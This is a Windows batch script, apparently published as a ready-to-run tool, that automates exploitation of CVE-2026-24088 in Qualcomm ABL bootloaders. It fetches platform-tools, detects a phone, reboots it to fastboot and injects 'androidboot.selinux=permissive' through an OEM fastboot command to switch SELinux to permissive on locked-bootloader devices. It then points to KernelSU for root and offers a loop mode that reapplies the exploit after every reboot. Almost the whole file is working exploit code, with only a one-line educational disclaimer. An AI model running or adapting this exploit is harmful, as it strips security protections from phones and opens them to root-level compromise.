@echo off
chcp 437 >nul 2>&1
title GBL Exploit v2.4 - CVE-2026-24088 ^| github.com/aniketlab
color 07
mode con: cols=65 lines=45

:: Permanent paths
set "SCRIPT_DIR=%~dp0"
if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
set "TOOLS_DIR=%SCRIPT_DIR%\platform-tools"
set "ADB_EXE=%TOOLS_DIR%\adb.exe"
set "FB_EXE=%TOOLS_DIR%\fastboot.exe"
set "TOOLS_URL=https://dl.google.com/android/repository/platform-tools-latest-windows.zip"
set "TOOLS_ZIP=%TEMP%\platform-tools.zip"
set "TMPOUT=%TEMP%\gbl_out.txt"
set "VERSION=2.4"

:: Log file setup
for /f "tokens=1-3 delims=/ " %%a in ("%DATE%") do set "LOGDATE=%%c%%a%%b"
for /f "tokens=1-3 delims=:." %%a in ("%TIME: =0%") do set "LOGTIME=%%a%%b%%c"
set "LOGFILE=%SCRIPT_DIR%\log_%LOGDATE%_%LOGTIME%.txt"

:: -------------------------------------------------------
:main_start
setlocal EnableDelayedExpansion
set "ADB=adb"
set "FASTBOOT=fastboot"
set "MODEL="
set "BRAND="
set "BOARD="
set "FIRMWARE="
set "ANDROID="
set "PATCH="
set "BOOTSTATE="
set "FAIL_REASON="
set "MODE=ADB"
set "DEVICE_SERIAL="

call :log_init

call :banner
echo.
echo  Starting automated exploit sequence...
echo.
timeout /t 1 /nobreak >nul


:: ============================================
:: STEP 1 - ADB CHECK + AUTO DOWNLOAD
:: ============================================
echo  [1/6] Checking ADB / Platform Tools...
echo.

call :find_or_download_adb
if errorlevel 1 goto :end_fail

echo.


:: ============================================
:: STEP 2 - FASTBOOT CHECK
:: ============================================
echo  [2/6] Checking Fastboot...
echo.

call :find_fastboot
if errorlevel 1 goto :end_fail

echo.


:: ============================================
:: STEP 3 - SMART DEVICE DETECTION
::          Handles ADB mode AND Fastboot mode
:: ============================================
echo  [3/6] Scanning for connected devices...
echo.

call :detect_any_device
if errorlevel 1 goto :end_fail

echo.


:: ============================================
:: STEP 4 - PRE-FLIGHT COMPATIBILITY CHECK
:: ============================================
echo  [4/6] Pre-flight compatibility check...
echo.

call :preflight_check

echo.


:: ============================================
:: STEP 5 - REBOOT TO FASTBOOT (skip if already there)
:: ============================================
if "!MODE!"=="FASTBOOT" (
    echo  [5/6] Device already in Fastboot mode - skipping reboot.
    echo.
    call :log_write "[5/6] Device already in Fastboot mode - skipped reboot."
) else (
    echo  [5/6] Rebooting !MODEL! to fastboot mode...
    "%ADB%" -s %DEVICE_SERIAL% reboot bootloader >nul 2>&1
    echo  [*] Waiting for fastboot...
    echo.
    call :log_write "[5/6] Sent ADB reboot bootloader command."

    call :wait_for_fastboot
    if errorlevel 1 goto :end_fail

    echo.
)


:: ============================================
:: STEP 6 - EXPLOIT
:: ============================================
echo  [6/6] Testing CVE-2026-24088...
echo.
echo  Running:
echo    fastboot oem set-gpu-preemption 0
echo             androidboot.selinux=permissive
echo.
call :log_write "[6/6] Running exploit: fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive"

"%FASTBOOT%" oem set-gpu-preemption 0 androidboot.selinux=permissive > "%TMPOUT%" 2>&1

echo  Fastboot response:
echo  - - - - - - - - - - - - - - - - - - -
type "%TMPOUT%"
echo  - - - - - - - - - - - - - - - - - - -
echo.
type "%TMPOUT%" >> "%LOGFILE%" 2>nul

findstr /i "OKAY" "%TMPOUT%" >nul 2>&1
if %errorlevel% equ 0 goto :success

findstr /i "unknown command" "%TMPOUT%" >nul 2>&1
if %errorlevel% equ 0 (
    set "FAIL_REASON=Command unknown - device not a GBL-affected Qualcomm device"
    goto :not_supported
)

set "FAIL_REASON=Command rejected - firmware is patched or device not affected"
goto :not_supported


:: ============================================
:: SUCCESS
:: ============================================
:success
color 0A
cls
echo.
echo  =================================================
echo.
echo   RESULT: EXPLOIT SUCCESSFUL!
echo.
echo   Device  : !MODEL!
echo   CVE     : CVE-2026-24088 VULNERABLE confirmed
echo   SELinux : now PERMISSIVE
echo.
echo  =================================================
echo.
call :log_write "[RESULT] EXPLOIT SUCCESSFUL - SELinux set to PERMISSIVE"

echo  [6/6] Continuing boot...
"%FASTBOOT%" continue >nul 2>&1
echo  [+] Device is booting now.
echo.
call :log_write "[INFO] fastboot continue sent. Device booting."

echo  -------------------------------------------------
echo   NEXT STEPS after phone fully boots:
echo  -------------------------------------------------
echo   1. Open KernelSU Manager OR ReSukiSU Manager
echo   2. Enable Jailbreak Mode
echo.
echo   Verify via ADB:
echo     adb shell getenforce    -> Permissive
echo     adb shell su -c id      -> uid=0(root)
echo.
echo   NOTE: Root is TEMPORARY. Run this script
echo   again after every reboot.
echo  -------------------------------------------------
echo.
echo   github.com/aniketlab/POCO-M7-Plus-Jailbreak
echo.
echo  Log saved to:
echo  %LOGFILE%
echo.
del "%TMPOUT%" >nul 2>&1

echo  -------------------------------------------------
echo   LOOP MODE: Auto re-apply root after each reboot?
echo  -------------------------------------------------
choice /c YN /n /m "  Enable Loop Mode? (Y/N): "
if %errorlevel% equ 1 (
    echo.
    echo  [LOOP] Waiting for device to reboot and reconnect...
    call :log_write "[LOOP] Loop mode enabled."
    :loop_wait_disconnect
    "%ADB%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
    if !errorlevel! equ 0 (
        timeout /t 3 /nobreak >nul
        goto :loop_wait_disconnect
    )
    echo  [LOOP] Device rebooted. Waiting to reconnect...
    endlocal
    goto :main_start
)

echo.
echo  Press any key to exit...
pause >nul
goto :done


:: ============================================
:: NOT SUPPORTED / PATCHED
:: ============================================
:not_supported
color 0C
cls
echo.
echo  =================================================
echo.
echo   RESULT: DEVICE NOT VULNERABLE / PATCHED
echo.
echo   Device  : !MODEL!
echo   SoC     : !BOARD!
echo   Reason  : !FAIL_REASON!
echo.
echo  =================================================
echo.
echo  Raw fastboot response:
echo  - - - - - - - - - - - - -
type "%TMPOUT%" 2>nul
echo  - - - - - - - - - - - - -
echo.
echo  Possible reasons:
echo   - Firmware is already patched
echo     (HyperOS 3.0.304.0+ for POCO M7 Plus)
echo     (HyperOS 3.0.303.0+ for Redmi 15 5G)
echo   - Device model not affected by this ABL flaw
echo     (older Snapdragon, Samsung, MediaTek etc.)
echo   - ABL updated via a security OTA
echo.
call :log_write "[RESULT] EXPLOIT FAILED - !FAIL_REASON!"

echo  [*] Rebooting !MODEL! back to normal...
"%FASTBOOT%" reboot >nul 2>&1
echo  [+] Device rebooting.
del "%TMPOUT%" >nul 2>&1
echo.
echo  Press any key to see options...
pause >nul
goto :retry_prompt


:: ============================================
:: RETRY PROMPT
:: ============================================
:retry_prompt
color 07
echo.
echo  -------------------------------------------------
echo.
echo   What do you want to do?
echo.
echo   [R] Retry from beginning
echo   [C] Clean up (delete downloaded tools)
echo   [E] Exit
echo.
echo  -------------------------------------------------
choice /c RCE /n /m "  Your choice (R/C/E): "
echo.
if %errorlevel% equ 1 (
    endlocal
    goto :main_start
)
if %errorlevel% equ 2 goto :cleanup_action
goto :done


:: ============================================
:: END FAIL
:: ============================================
:end_fail
echo.
echo  Press any key to see options...
pause >nul
goto :retry_prompt


:: ============================================
:: CLEANUP
:: ============================================
:cleanup_action
color 07
echo.
echo  -------------------------------------------------
echo   CLEANUP
echo  -------------------------------------------------
echo.
if exist "%TOOLS_DIR%" (
    echo  [*] Deleting: %TOOLS_DIR%
    rd /s /q "%TOOLS_DIR%" >nul 2>&1
    if exist "%TOOLS_DIR%" (
        echo  [X] Could not delete - close any programs using it.
    ) else (
        echo  [+] Deleted successfully.
    )
) else (
    echo  [i] platform-tools not found. Already clean.
)
echo.
if exist "%TOOLS_ZIP%" (
    echo  [*] Deleting leftover zip...
    del /f /q "%TOOLS_ZIP%" >nul 2>&1
    echo  [+] Zip deleted.
) else (
    echo  [i] No leftover zip. Already clean.
)
echo.
echo  Cleanup done. Next run will re-download tools.
echo.
choice /c RE /n /m "  (R) Retry  (E) Exit: "
if %errorlevel% equ 1 (
    endlocal
    goto :main_start
)
goto :done


:: ============================================
:: DONE
:: ============================================
:done
color 07
del "%TMPOUT%" >nul 2>&1
endlocal
exit /b


:: ============================================
:: SUB: LOG INIT
:: ============================================
:log_init
echo ====================================================== > "%LOGFILE%"
echo  GBL-AutoRoot v%VERSION% Session Log >> "%LOGFILE%"
echo  Date: %DATE%  %TIME% >> "%LOGFILE%"
echo ====================================================== >> "%LOGFILE%"
exit /b

:: ============================================
:: SUB: LOG WRITE
:: ============================================
:log_write
echo [%TIME%] %~1 >> "%LOGFILE%"
exit /b


:: ============================================
:: SUB: FIND OR DOWNLOAD ADB
:: ============================================
:find_or_download_adb

:: 1. Check local folder first
if exist "%ADB_EXE%" (
    "%ADB_EXE%" version > "%TEMP%\adbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\adbver.txt"') do echo  [+] Local ADB: %%v
    del "%TEMP%\adbver.txt" >nul 2>&1
    set "ADB=%ADB_EXE%"
    set "PATH=%TOOLS_DIR%;%PATH%"
    exit /b 0
)

:: 2. Check system PATH
adb version >nul 2>&1
if %errorlevel% equ 0 (
    adb version > "%TEMP%\adbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\adbver.txt"') do echo  [+] System ADB: %%v
    del "%TEMP%\adbver.txt" >nul 2>&1
    set "ADB=adb"
    exit /b 0
)

:: 3. Download
echo  [-] ADB not found. Downloading from Google...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ProgressPreference='SilentlyContinue';" ^
  "$url='%TOOLS_URL%';" ^
  "$out='%TOOLS_ZIP%';" ^
  "try {" ^
    "$req=[System.Net.HttpWebRequest]::Create($url);" ^
    "$req.UserAgent='Mozilla/5.0';" ^
    "$resp=$req.GetResponse();" ^
    "$total=$resp.ContentLength;" ^
    "$stream=$resp.GetResponseStream();" ^
    "$fs=[System.IO.File]::Create($out);" ^
    "$buf=New-Object byte[] 32768;" ^
    "$dl=0;" ^
    "$sw=[System.Diagnostics.Stopwatch]::StartNew();" ^
    "while(($r=$stream.Read($buf,0,$buf.Length))-gt 0){" ^
      "$fs.Write($buf,0,$r);$dl+=$r;" ^
      "$pct=[int](($dl/$total)*100);" ^
      "$dlMB=[math]::Round($dl/1MB,1);" ^
      "$totMB=[math]::Round($total/1MB,1);" ^
      "$spd=if($sw.Elapsed.TotalSeconds-gt 0){[math]::Round($dlMB/$sw.Elapsed.TotalSeconds,1)}else{0};" ^
      "$bar='#'*[int]($pct/4);" ^
      "$empty=' '*(25-[int]($pct/4));" ^
      "Write-Host('  [{0}{1}] {2,3}%% | {3} MB / {4} MB | {5} MB/s   '-f $bar,$empty,$pct,$dlMB,$totMB,$spd) -NoNewline;" ^
      "[Console]::SetCursorPosition(0,[Console]::CursorTop)" ^
    "};" ^
    "$fs.Close();$stream.Close();" ^
    "Write-Host ''" ^
  "} catch { Write-Host ''; Write-Host ('  [X] ' + $_.Exception.Message) }"

echo.

if not exist "%TOOLS_ZIP%" (
    echo  [X] Download failed. Check internet connection.
    exit /b 1
)

echo  [*] Extracting...
powershell -NoProfile -Command "Expand-Archive -Path '%TOOLS_ZIP%' -DestinationPath '%SCRIPT_DIR%' -Force" 2>nul
del "%TOOLS_ZIP%" >nul 2>&1

if not exist "%ADB_EXE%" (
    echo  [X] Extraction failed. adb.exe not found after extract.
    exit /b 1
)

set "ADB=%ADB_EXE%"
set "PATH=%TOOLS_DIR%;%PATH%"
echo  [+] Platform Tools ready.
exit /b 0


:: ============================================
:: SUB: FIND FASTBOOT
:: ============================================
:find_fastboot

if exist "%FB_EXE%" (
    "%FB_EXE%" --version > "%TEMP%\fbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\fbver.txt"') do echo  [+] Local Fastboot: %%v
    del "%TEMP%\fbver.txt" >nul 2>&1
    set "FASTBOOT=%FB_EXE%"
    exit /b 0
)

fastboot --version >nul 2>&1
if %errorlevel% equ 0 (
    fastboot --version > "%TEMP%\fbver.txt" 2>&1
    for /f "tokens=*" %%v in ('findstr /i "version" "%TEMP%\fbver.txt"') do echo  [+] System Fastboot: %%v
    del "%TEMP%\fbver.txt" >nul 2>&1
    set "FASTBOOT=fastboot"
    exit /b 0
)

:: Missing fastboot - re-download
echo  [!] fastboot.exe missing. Fixing automatically...
echo.
if exist "%TOOLS_DIR%" rd /s /q "%TOOLS_DIR%" >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ProgressPreference='SilentlyContinue';" ^
  "$url='%TOOLS_URL%';" ^
  "$out='%TOOLS_ZIP%';" ^
  "try {" ^
    "$req=[System.Net.HttpWebRequest]::Create($url);" ^
    "$req.UserAgent='Mozilla/5.0';" ^
    "$resp=$req.GetResponse();" ^
    "$total=$resp.ContentLength;" ^
    "$stream=$resp.GetResponseStream();" ^
    "$fs=[System.IO.File]::Create($out);" ^
    "$buf=New-Object byte[] 32768;" ^
    "$dl=0;" ^
    "$sw=[System.Diagnostics.Stopwatch]::StartNew();" ^
    "while(($r=$stream.Read($buf,0,$buf.Length))-gt 0){" ^
      "$fs.Write($buf,0,$r);$dl+=$r;" ^
      "$pct=[int](($dl/$total)*100);" ^
      "$dlMB=[math]::Round($dl/1MB,1);" ^
      "$totMB=[math]::Round($total/1MB,1);" ^
      "$spd=if($sw.Elapsed.TotalSeconds-gt 0){[math]::Round($dlMB/$sw.Elapsed.TotalSeconds,1)}else{0};" ^
      "$bar='#'*[int]($pct/4);" ^
      "$empty=' '*(25-[int]($pct/4));" ^
      "Write-Host('  [{0}{1}] {2,3}%% | {3} MB / {4} MB | {5} MB/s   '-f $bar,$empty,$pct,$dlMB,$totMB,$spd) -NoNewline;" ^
      "[Console]::SetCursorPosition(0,[Console]::CursorTop)" ^
    "};" ^
    "$fs.Close();$stream.Close();" ^
    "Write-Host ''" ^
  "} catch { Write-Host ''; Write-Host ('  [X] ' + $_.Exception.Message) }"

if not exist "%TOOLS_ZIP%" (
    echo  [X] Download failed. Check internet connection.
    exit /b 1
)

powershell -NoProfile -Command "Expand-Archive -Path '%TOOLS_ZIP%' -DestinationPath '%SCRIPT_DIR%' -Force" 2>nul
del "%TOOLS_ZIP%" >nul 2>&1

if not exist "%FB_EXE%" (
    echo  [X] Still missing after re-download. Something went wrong.
    exit /b 1
)

set "ADB=%ADB_EXE%"
set "FASTBOOT=%FB_EXE%"
set "PATH=%TOOLS_DIR%;%PATH%"
echo  [+] Fixed. Full platform-tools now available.
exit /b 0


:: ============================================
:: SUB: SMART DETECT - ADB or FASTBOOT
:: ============================================
:detect_any_device
set "DEVICE_FOUND=0"
set "DEVICE_SERIAL="
set "MODE=ADB"

:: 1. Quick check ADB
for /f "skip=1 tokens=1,2" %%a in ('"%ADB%" devices 2^>nul') do (
    if "%%b"=="device" (
        set "DEVICE_FOUND=1"
        set "DEVICE_SERIAL=%%a"
        set "MODE=ADB"
    )
)
if "!DEVICE_FOUND!"=="1" goto :device_collect_info

:: 2. Quick check Fastboot
for /f "tokens=1" %%a in ('"%FASTBOOT%" devices 2^>nul') do (
    if not "%%a"=="" (
        set "DEVICE_FOUND=1"
        set "DEVICE_SERIAL=%%a"
        set "MODE=FASTBOOT"
    )
)
if "!DEVICE_FOUND!"=="1" goto :device_collect_fastboot

:: 3. Wait loop - nothing found yet
echo  [-] No device detected yet.
echo.
echo  Connect your phone via USB. Script auto-detects:
echo    - Normal mode (ADB / USB Debugging ON)
echo    - Fastboot mode (already in bootloader)
echo.
echo  Waiting up to 60 seconds...
<nul set /p ="  "

set "WAIT=0"
:detect_loop
if !WAIT! geq 30 goto :detect_timeout
timeout /t 2 /nobreak >nul
set /a WAIT+=1
<nul set /p ="."

set "DEVICE_FOUND=0"
for /f "skip=1 tokens=1,2" %%a in ('"%ADB%" devices 2^>nul') do (
    if "%%b"=="device" (
        set "DEVICE_FOUND=1"
        set "DEVICE_SERIAL=%%a"
        set "MODE=ADB"
    )
)
if "!DEVICE_FOUND!"=="1" (
    echo.
    echo  [+] ADB Device connected!
    goto :device_collect_info
)

for /f "tokens=1" %%a in ('"%FASTBOOT%" devices 2^>nul') do (
    if not "%%a"=="" (
        set "DEVICE_FOUND=1"
        set "DEVICE_SERIAL=%%a"
        set "MODE=FASTBOOT"
    )
)
if "!DEVICE_FOUND!"=="1" (
    echo.
    echo  [+] Fastboot Device detected!
    goto :device_collect_fastboot
)
goto :detect_loop

:detect_timeout
echo.
echo.
echo  [X] No device detected after 60 seconds.
exit /b 1

:device_collect_info
echo.
echo  [+] Reading device info...
echo.
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.brand 2^>nul') do set "BRAND=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.model 2^>nul') do set "MODEL=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.version.release 2^>nul') do set "ANDROID=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.version.security_patch 2^>nul') do set "PATCH=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.product.board 2^>nul') do set "BOARD=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.boot.verifiedbootstate 2^>nul') do set "BOOTSTATE=%%i"
for /f "delims=" %%i in ('"%ADB%" -s %DEVICE_SERIAL% shell getprop ro.build.version.incremental 2^>nul') do set "FIRMWARE=%%i"
call :log_write "[DEVICE] Brand=!BRAND! Model=!MODEL! Android=!ANDROID! Patch=!PATCH! Board=!BOARD! Mode=ADB Firmware=!FIRMWARE!"

echo  -------------------------------------------------
echo   Device Info
echo  -------------------------------------------------
echo   Brand         : !BRAND!
echo   Model         : !MODEL!
echo   Android       : !ANDROID!
echo   Security Patch: !PATCH!
echo   Board / SoC   : !BOARD!
echo   Boot State    : !BOOTSTATE!
echo   Serial        : %DEVICE_SERIAL%
echo  -------------------------------------------------
echo.
echo  [i] Works on ANY Qualcomm ABL vulnerable device.
echo      OKAY response = root granted. Anything
echo      else = device not affected or patched.
exit /b 0

:device_collect_fastboot
echo.
echo  [+] Reading device info via Fastboot...
echo.
set "BRAND=Xiaomi/POCO"
set "MODEL=Unknown"
set "BOARD=Unknown"
for /f "tokens=2 delims= " %%i in ('"%FASTBOOT%" -s %DEVICE_SERIAL% getvar product 2^>^&1 ^| findstr "product:"') do set "MODEL=%%i"
call :log_write "[DEVICE] Brand=!BRAND! Model=!MODEL! Mode=FASTBOOT Serial=!DEVICE_SERIAL!"

echo  -------------------------------------------------
echo   Device Info
echo  -------------------------------------------------
echo   Brand   : !BRAND!
echo   Model   : !MODEL!
echo   Serial  : !DEVICE_SERIAL!
echo   Mode    : FASTBOOT (already in bootloader)
echo  -------------------------------------------------
echo.
echo  [i] Device already in fastboot - skipping reboot.
exit /b 0


:: ============================================
:: SUB: PRE-FLIGHT COMPATIBILITY CHECK
:: ============================================
:preflight_check

if "!MODE!"=="ADB" (
    if "!BOOTSTATE!"=="green" (
        echo  [PASS] Bootloader locked - ABL injection target confirmed.
        call :log_write "[PREFLIGHT] Bootloader locked (green)."
    ) else if "!BOOTSTATE!"=="orange" (
        echo  [WARN] Bootloader is UNLOCKED (orange state).
        call :log_write "[PREFLIGHT] Bootloader already unlocked."
    ) else (
        echo  [INFO] Boot state: !BOOTSTATE!
    )
    echo  [INFO] Firmware: !FIRMWARE!
    call :log_write "[PREFLIGHT] Firmware version: !FIRMWARE!"
)

exit /b 0


:: ============================================
:: SUB: WAIT FOR FASTBOOT DEVICE (30s loop)
:: ============================================
:wait_for_fastboot
set "FB_READY=0"
<nul set /p ="  Detecting "

set "FBWAIT=0"
:fb_loop
if !FBWAIT! geq 30 goto :fb_timeout
timeout /t 1 /nobreak >nul
set /a FBWAIT+=1
<nul set /p ="."

"%FASTBOOT%" devices 2>nul | findstr /r "[a-zA-Z0-9]" >nul 2>&1
if !errorlevel! equ 0 (
    set "FB_READY=1"
    goto :fb_found
)
goto :fb_loop

:fb_timeout
echo.
echo.
echo  [X] Device did not enter fastboot within 30 seconds.
call :log_write "[FASTBOOT] Timeout waiting for fastboot mode."
exit /b 1

:fb_found
echo.
echo.
for /f "tokens=1" %%i in ('"%FASTBOOT%" devices 2^>nul') do set "DEVICE_SERIAL=%%i"
echo  [FASTBOOT] Ready. Serial: !DEVICE_SERIAL!
call :log_write "[FASTBOOT] Ready. Serial: !DEVICE_SERIAL!"
exit /b 0


:: ============================================
:: BANNER
:: ============================================
:banner
cls
echo.
echo  =================================================
echo   Qualcomm GBL Exploit v%VERSION% - CVE-2026-24088
echo   Automated Root via ABL Cmdline Injection
echo  -------------------------------------------------
echo   Tested     : POCO M7 Plus 5G (SM6375)
echo   Compatible : Any Qualcomm ABL vulnerable device
echo   Author     : github.com/aniketlab
echo   Disclaimer : Educational Research Only
echo  =================================================
goto :eof
